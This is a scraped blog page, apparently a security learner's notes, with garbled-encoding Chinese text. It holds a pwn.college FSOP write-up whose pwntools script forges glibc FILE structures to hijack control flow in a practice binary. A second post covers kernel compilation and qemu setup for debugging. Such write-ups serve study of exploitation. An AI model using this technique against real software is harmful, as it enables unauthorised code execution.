0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#11 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#12 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#13 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#14 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#15 0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#16 __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#17 0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#18 0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#19 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#20 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#21 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#22 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#23 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä¸Šè¿°pocéªŒè¯äº†è¿™ä¸ªæ‚²å‰§</p>
<p>ä½†æ˜¯è¿™ä¸ªpocä¹Ÿç»™æˆ‘å¦ä¸€ä¸ªæƒ³æ³•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.stdoutæŒ‡å‘fp</span></span><br><span class="line"><span class="built_in">stdout</span> = fp;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨è¿™é‡Œæˆ‘ä»¬ä¿æŒstdoutçš„å®Œæ•´æ€§,åªæ˜¯æ”¹å˜å…¶åç»§æŒ‡é’ˆ<code>_chain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//6.fpå€ŸåŠ©stdoutä¸Šé“¾</span><br><span class="line">stdout -&gt; _chain = fp;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨ç¨‹åºé€€å‡ºæ—¶åˆ©ç”¨<code>FSOP</code>çš„æœºåˆ¶, winå°±ä¼šè¢«è°ƒç”¨, å®éªŒè¯æ˜ç¡®å®å¦‚æ­¤</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# ./stdout</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> @ 0x7f220bf40110</span><br><span class="line">_IO_wfile_jumps @ 0x7f220c0c1268</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¸€ä¸ª<code>struct _IO_FILE_plus</code>å¤§å°æ˜¯<code>0xe0 B</code>,ä¸¤ä¸ªå°±æ˜¯<code>0x1c0 B</code></p>
<p>è€Œ<code>level9</code>å…è®¸æˆ‘ä»¬å†™å…¥<code>0x1e0 B</code>,èƒ½æ”¾å¼€ä¸¤ä¸ª<code>struct _IO_FILE_plus</code>è¿˜èƒ½å‰©ä¸‹<code>0x20 B</code>ç©ºé—´ç”¨äºå¸ƒç½®<code>wide_data</code>å’Œ<code>wide_vtable</code></p>
<p>æº¢å‡ºæ—¶<code>stdout</code>é¦–å½“å…¶å†², æˆ‘ä»¬éœ€è¦ä¿æŒå…¶<code>flag </code>, <code>vtable</code>ä¸å˜ , å¹¶ä¸”ç»™å…¶<code>lock</code>æ‰¾ä¸€ä¸ªåˆé€‚çš„åœ°æ–¹(ä¸€ä¸ªå¯å†™ä¸”å€¼ä¸º0çš„åœ°æ–¹)</p>
<p>æ¥ä¸‹æ¥çš„æº¢å‡ºä¼šæ¯å<code>libc</code>ä¸­çš„ä¸€äº›æ•°æ®, ä½†æ˜¯ä¸ä¼šå½±å“åˆ°æ§åˆ¶æµ, ç‹ ç‹ æåå®ƒ</p>
<p>ç”»åœ¨å›¾ä¸Šæ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241007211929871.png" alt="stdout-&gt;_chain = fake_fp"></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level9&quot;</span>)</span><br><span class="line"></span><br><span class="line">authenticated_addr = <span class="number">0x401866</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.æ³„éœ²libcåŸºåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">stdout_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">_IO_file_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_file_jumps&#x27;</span>)</span><br><span class="line">_IO_wfile_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.fake_fpåº”è¯¥è·Ÿåœ¨stdoutä¹‹å</span></span><br><span class="line">fake_fp_addr = stdout_addr + <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout @ &quot;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp @ &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp_addr - stdout_addr = &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr - stdout_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = fake_fp_addr + <span class="number">0xe0</span> - <span class="number">0xe0</span></span><br><span class="line">fake_IO_wdoallocbuf_addr = fake_fp_addr + <span class="number">0xe0</span> + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_IO_wdoallocbuf_addr @ &quot;</span>,<span class="built_in">hex</span>(fake_IO_wdoallocbuf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.æ„é€ stdout_fp,ä¿è¯å…¶flags,filenoä¸å˜</span></span><br><span class="line"><span class="comment">#lockæŒ‡å‘ä¸€ä¸ªå¯å†™å€¼ä¸º0çš„åœ°æ–¹,æ¯”å¦‚fake_fp_addr-&gt;read_buf_ptr</span></span><br><span class="line"><span class="comment">#chainæŒ‡å‘ç´§è·Ÿåœ¨åè¾¹çš„fake_fp</span></span><br><span class="line"><span class="comment">#vtableä¿æŒä½¿ç”¨é»˜è®¤çš„_IO_file_jumps_addr</span></span><br><span class="line">fake_stdout_fp = FileStructure()</span><br><span class="line">fake_stdout_fp.flags = <span class="number">0xfbad2887</span></span><br><span class="line">fake_stdout_fp.fileno = <span class="number">1</span></span><br><span class="line">fake_stdout_fp.chain = fake_fp_addr</span><br><span class="line">fake_stdout_fp._lock = fake_fp_addr + <span class="number">0x8</span></span><br><span class="line">fake_stdout_fp.vtable = _IO_file_jumps_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.æ„é€ fake_fp,</span></span><br><span class="line"><span class="comment">#æ ¹æ®FSOPçš„æ¡ä»¶æ„é€ å…¶æˆå‘˜</span></span><br><span class="line">fake_fp = FileStructure()</span><br><span class="line">fake_fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">0x2</span>)</span><br><span class="line">fake_fp._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_fp._IO_write_end =<span class="number">0</span></span><br><span class="line">fake_fp._lock = fake_fp_addr + <span class="number">0x10</span></span><br><span class="line">fake_fp.vtable = _IO_wfile_jumps_addr</span><br><span class="line">fake_fp._wide_data = fake_wide_data_addr   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fake_stdout_fp)</span><br><span class="line"><span class="built_in">print</span>(fake_fp)</span><br><span class="line"></span><br><span class="line">payload =<span class="built_in">bytes</span>(fake_stdout_fp) + <span class="built_in">bytes</span>(fake_fp) + p64(fake_IO_wdoallocbuf_addr - <span class="number">0x68</span>) + p64(authenticated_addr) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>ç›¸æ¯”äºlevel8,å¤šäº†ä¸€æ­¥</p>
<p>åœ¨è°ƒç”¨wide_vtableå‡½æ•°æ—¶éœ€è¦ä¼ é€’å­—ç¬¦ä¸²å‚æ•°</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-21 17:19:00" itemprop="dateCreated datePublished" datetime="2024-05-21T17:19:00+08:00">2024-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 17:22:59" itemprop="dateModified" datetime="2024-07-05T17:22:59+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å†…æ ¸è°ƒè¯•"><a href="#å†…æ ¸è°ƒè¯•" class="headerlink" title="å†…æ ¸è°ƒè¯•"></a>å†…æ ¸è°ƒè¯•</h1><p>[TOC]</p>
<h2 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h2><h3 id="ç¼–è¯‘å†…æ ¸"><a href="#ç¼–è¯‘å†…æ ¸" class="headerlink" title="ç¼–è¯‘å†…æ ¸"></a>ç¼–è¯‘å†…æ ¸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/src</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.7.tar.gz</span><br><span class="line">tar -xzf linux-6.7.tar.gz</span><br><span class="line">cd linux-6.7</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>Kernel hakcing-&gt;</p>
<p>Compile-time checks and compiler options-&gt;</p>
<p>Debug information-&gt;Rely on the toolchainâ€™s implicit default DWARF version</p>
<p>æˆ–è€…çŸ®äºº4æˆ–è€…çŸ®äºº5æ ¼å¼çš„è°ƒè¯•ä¿¡æ¯éƒ½å¯ä»¥,åªè¦æ˜¯å¸¦ç€è°ƒè¯•ä¿¡æ¯å°±å¯</p>
<p>é…ç½®å®Œæˆä¹‹å</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…ç¼–è¯‘é“¾æ¥å®Œæˆä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<h3 id="ç”Ÿæˆæ–‡ä»¶"><a href="#ç”Ÿæˆæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆæ–‡ä»¶"></a>ç”Ÿæˆæ–‡ä»¶</h3><p>å†…æ ¸çš„ç¼–è¯‘é“¾æ¥æœ‰ä¸‰ä¸ªé˜¶æ®µ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240222203727335.png" alt="image-20240222203727335"></p>
<h4 id="vmlinux"><a href="#vmlinux" class="headerlink" title="vmlinux"></a>vmlinux</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name vmlinux</span><br><span class="line">./arch/x86/boot/compressed/vmlinux</span><br><span class="line">./vmlinux</span><br><span class="line">./tools/perf/util/bpf_skel/vmlinux  //è¿™å®é™…æ˜¯vmlinux.hå¤´æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>æ ¹ç›®å½•ä¸‹é¢è¿™ä¸ªå¸¦æœ‰è°ƒè¯•ç¬¦å·çš„linux elf,ä¸å¯ä»¥ä½œä¸ºå¼•å¯¼å†…æ ¸,æ˜¯ç¬¬ä¸€æ¬¡ç¼–è¯‘é“¾æ¥çš„äº§ç‰©<br /></p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;compressed&#x2F;vmlinuxè¿™ä¸ªæ˜¯å’Œpiggyç­‰åˆé“¾æ¥è¿‡çš„,å¹¶ä¸”ç»è¿‡äº†å‹ç¼©</p>
<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name bzImage</span><br><span class="line">./arch/x86/boot/bzImage</span><br><span class="line">./arch/x86_64/boot/bzImage</span><br></pre></td></tr></table></figure>

<p>çœŸçš„bzImageåªæœ‰ä¸€ä¸ª,åªä¸è¿‡x86_64ä¸‹é¢è¿™ä¸ª,æ˜¯x86è¿™ä¸ªçš„é“¾æ¥</p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImageè¿™ä¸ªæ˜¯æœ€ç»ˆäº§ç‰©,å¯ä»¥å¼•å¯¼</p>
<h4 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h4><p>å†…æ ¸ç¼–è¯‘é“¾æ¥å®Œæ¯•å,åœ¨é¡¹ç›®æ ¹ç›®å½•make install,ä¼šåœ¨&#x2F;boot&#x2F;ä¸‹é¢ç”Ÿæˆvmlinuz-&lt;ç‰ˆæœ¬å·&gt;</p>
<p>è¿™ä¸ªvmlinuz-&lt;ç‰ˆæœ¬å·&gt;å®é™…ä¸Šå°±æ˜¯bzImage</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/boot# ll /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 14:44 /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">root@Destroyer:/boot# ll vmlinuz*</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 20:42 vmlinuz-6.7.0</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 21 20:00 vmlinuz-6.7.0.old</span><br></pre></td></tr></table></figure>

<h3 id="qemuè™šæ‹Ÿæœº"><a href="#qemuè™šæ‹Ÿæœº" class="headerlink" title="qemuè™šæ‹Ÿæœº"></a>qemuè™šæ‹Ÿæœº</h3><p>qemuçš„ä½œç”¨ç±»ä¼¼äºvmware,ä½†æ˜¯å¯ä»¥æ›´è‡ªç”±åœ°é…ç½®,è°ƒè¯•å…¶ä¸Šè¿è¡Œçš„å†…æ ¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/qemu/qemu.git</span><br><span class="line">cd qemu</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å¯ä»¥åœ¨ä»»æ„ç›®å½•ä½¿ç”¨qemuå·¥å…·äº†</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball# qemu-</span><br><span class="line">qemu-edid                      qemu-system-i386w.exe          qemu-system-riscv32w.exe</span><br><span class="line">qemu-edid.exe                  qemu-system-loongarch64.exe    qemu-system-riscv64.exe</span><br><span class="line">qemu-ga                        qemu-system-loongarch64w.exe   qemu-system-riscv64w.exe</span><br><span class="line">qemu-ga.exe                    qemu-system-m68k.exe           qemu-system-rx.exe</span><br><span class="line">qemu-img                       qemu-system-m68kw.exe          qemu-system-rxw.exe</span><br><span class="line">qemu-img.exe                   qemu-system-microblaze.exe     qemu-system-s390x.exe</span><br><span class="line">qemu-io                        qemu-system-microblazeel.exe   qemu-system-s390xw.exe</span><br><span class="line">qemu-io.exe                    qemu-system-microblazeelw.exe  qemu-system-sh4.exe</span><br><span class="line">qemu-nbd                       qemu-system-microblazew.exe    qemu-system-sh4eb.exe</span><br><span class="line">qemu-nbd.exe                   qemu-system-mips.exe           qemu-system-sh4ebw.exe</span><br><span class="line">qemu-pr-helper                 qemu-system-mips64.exe         qemu-system-sh4w.exe</span><br><span class="line">qemu-storage-daemon            qemu-system-mips64el.exe       qemu-system-sparc.exe</span><br><span class="line">qemu-storage-daemon.exe        qemu-system-mips64elw.exe      qemu-system-sparc64.exe</span><br><span class="line">qemu-system-aarch64.exe        qemu-system-mips64w.exe        qemu-system-sparc64w.exe</span><br><span class="line">qemu-system-aarch64w.exe       qemu-system-mipsel.exe         qemu-system-sparcw.exe</span><br><span class="line">qemu-system-alpha.exe          qemu-system-mipselw.exe        qemu-system-tricore.exe</span><br><span class="line">qemu-system-alphaw.exe         qemu-system-mipsw.exe          qemu-system-tricorew.exe</span><br><span class="line">qemu-system-arm.exe            qemu-system-nios2.exe          qemu-system-x86_64</span><br><span class="line">qemu-system-armw.exe           qemu-system-nios2w.exe         qemu-system-x86_64.exe</span><br><span class="line">qemu-system-avr.exe            qemu-system-or1k.exe           qemu-system-x86_64w.exe</span><br><span class="line">qemu-system-avrw.exe           qemu-system-or1kw.exe          qemu-system-xtensa.exe</span><br><span class="line">qemu-system-cris.exe           qemu-system-ppc.exe            qemu-system-xtensaeb.exe</span><br><span class="line">qemu-system-crisw.exe          qemu-system-ppc64.exe          qemu-system-xtensaebw.exe</span><br><span class="line">qemu-system-hppa.exe           qemu-system-ppc64w.exe         qemu-system-xtensaw.exe</span><br><span class="line">qemu-system-hppaw.exe          qemu-system-ppcw.exe           qemu-uninstall.exe</span><br><span class="line">qemu-system-i386.exe           qemu-system-riscv32.exe</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¸¦æœ‰systemå­—æ ·çš„æ˜¯ä¸ºäº†é€‚åº”ä¸åŒçš„æ¶æ„</p>
<p>æœ‰<code>qemu-system-x86_64</code>å°±å¤Ÿäº†</p>
<p>qemu-imgæ˜¯åˆ›å»ºè™šæ‹Ÿç£ç›˜ä½¿ç”¨çš„</p>
<p>å¦‚ä¸‹æ˜¯ç”¨qemuå¯åŠ¨ä¸€ä¸ªè™šæ‹Ÿæœºçš„å‘½ä»¤</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s \</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­</p>
<p>-mæ˜¯è™šæ‹Ÿæœºè¿è¡Œå†…å­˜</p>
<p>-kernelæŒ‡å®šå†…æ ¸é•œåƒæ–‡ä»¶åœ¨æœ¬æœºä¸­çš„åœ°å€</p>
<p><strong>-initrdæŒ‡å®šå†…å­˜æ–‡ä»¶ç³»ç»Ÿ,ç°åœ¨å¯ä»¥ç†è§£ä¸ºç£ç›˜</strong></p>
<p>-appendæ˜¯å¯åŠ¨å‚æ•°</p>
<p>-smpæŒ‡å®šå¤šæ ¸å¤šçº¿ç¨‹</p>
<p>-cpuæŒ‡å®šè™šæ‹ŸCPUçš„ç±»å‹</p>
<p>-så¯åŠ¨è°ƒè¯•ç›‘å¬,å…è®¸gdbéšæ—¶è¿œç¨‹é™„åŠ è°ƒè¯•</p>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯â€å†…å­˜æ–‡ä»¶ç³»ç»Ÿâ€</p>
<h3 id="å†…å­˜æ–‡ä»¶ç³»ç»Ÿ"><a href="#å†…å­˜æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="å†…å­˜æ–‡ä»¶ç³»ç»Ÿ"></a>å†…å­˜æ–‡ä»¶ç³»ç»Ÿ</h3><p>ä¹‹å‰æœ‰ä¸€æ¬¡å®‰è£…kaliè™šæ‹Ÿæœºæ—¶,ç¬¬ä¸€æ¬¡å¼€æœºæ²¡æœ‰è¿›å…¥åˆ°æ¡Œé¢,è€Œæ˜¯ä¸€ä¸ª(initramfs)çš„shell</p>
<p>æ„æ€æ˜¯,æ“ä½œç³»ç»Ÿå†…æ ¸å·²ç»èµ·æ¥äº†,ä½†æ˜¯æ²¡æœ‰æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿrootfs</p>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯å†…å­˜æ–‡ä»¶ç³»ç»Ÿ,ä»€ä¹ˆæ˜¯æ ¹æ–‡ä»¶ç³»ç»Ÿå‘¢</p>
<p>é¦–å…ˆè¦æ˜ç¡®,å†…æ ¸ç¦»äº†ç¡¬ç›˜ä¹Ÿæ˜¯èƒ½æ´»ç€çš„,å¯ä»¥ç”¨å…¶ä»–æ–‡ä»¶ç³»ç»Ÿæ¯”å¦‚ç½‘ç»œæˆ–è€…å†…å­˜æ–‡ä»¶ç³»ç»Ÿ</p>
<p>å†…å­˜æ–‡ä»¶ç³»ç»Ÿæ˜¯å†…æ ¸å¯åŠ¨è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ,å†…å­˜æ–‡ä»¶ç³»ç»Ÿ(initrdæˆ–è€…initramfs)ä¹Ÿæ˜¯ä¸€ä¸ªå®Œæ•´çš„linuxç›®å½•æ ‘,å¹¶ä¸”åœ¨&#x2F;binä¸‹é¢æœ‰ä¸€å¥—ç²¾ç®€çš„å‘½ä»¤å·¥å…·é›†,æ¯”å¦‚busybox.åœ¨sbinä¸‹ä¹Ÿæœ‰ç›¸å…³å·¥å…·æ¯”å¦‚insmod,é€šå¸¸ä¹Ÿæ˜¯é“¾æ¥åˆ°&#x2F;bin&#x2F;busybox</p>
<p>è¿™äº›å·¥å…·åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å¯ä»¥ä¾›å†…æ ¸è°ƒç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox<span class="number">-1.36</span><span class="number">.1</span>/_install<span class="meta"># tree -L 1</span></span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ bin			<span class="comment">//ç”¨æˆ·å·¥å…·</span></span><br><span class="line">â”œâ”€â”€ dev</span><br><span class="line">â”œâ”€â”€ etc</span><br><span class="line">â”œâ”€â”€ init		<span class="comment">//å¼€æœºè‡ªåŠ¨æ‰§è¡Œçš„ä»»åŠ¡è„šæœ¬</span></span><br><span class="line">â”œâ”€â”€ ktest.ko	</span><br><span class="line">â”œâ”€â”€ linuxrc -&gt; bin/busybox</span><br><span class="line">â”œâ”€â”€ proc</span><br><span class="line">â”œâ”€â”€ sbin	